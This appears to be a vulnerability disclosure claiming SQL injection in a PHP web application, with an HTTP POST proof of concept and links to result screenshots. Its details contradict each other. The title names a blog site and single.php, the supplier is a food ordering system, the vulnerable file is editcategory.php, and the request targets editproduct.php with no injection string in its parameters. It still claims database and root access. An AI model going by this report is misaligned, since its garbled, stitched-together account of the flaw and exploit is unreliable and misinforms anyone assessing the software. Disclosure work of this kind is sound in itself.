# Responsive Blog Site has sql injection in single.php

## supplier 
https://code-projects.org/simple-food-ordering-system-in-php-with-source-code/
## Vulnerability file
editcategory.php

## describe

**Code analysis**   

In the editcategory.php file of Responsive Blog Site, the id parameter is obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

![image-2025](https://github.com/asd1238525/cve/blob/main/4a16838e-63e2-431f-b49e-e5f841e01c65.png)


## POC

```

POST /foodorder/ordersimple/editproduct.php?product=21 HTTP/1.1
Host: 127.0.0.1:8083
Content-Length: 488
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8083
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7hViVya87JW51fg4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8083/foodorder/ordersimple/product.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundary7hViVya87JW51fg4
Content-Disposition: form-data; name="pname"

Eggs in a Basket
------WebKitFormBoundary7hViVya87JW51fg4
Content-Disposition: form-data; name="category"

4
------WebKitFormBoundary7hViVya87JW51fg4
Content-Disposition: form-data; name="price"

375
------WebKitFormBoundary7hViVya87JW51fg4
Content-Disposition: form-data; name="photo"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundary7hViVya87JW51fg4--

```

**Result**
![image-2025](https://github.com/asd1238525/cve/blob/main/db858f8b-0474-4d18-9423-6dbe233ecbd3.png)
Get databases and is-rootdba
![image-2025](https://github.com/asd1238525/cve/blob/main/4f06521e-3cd6-4722-abae-a6c862a84b13.png)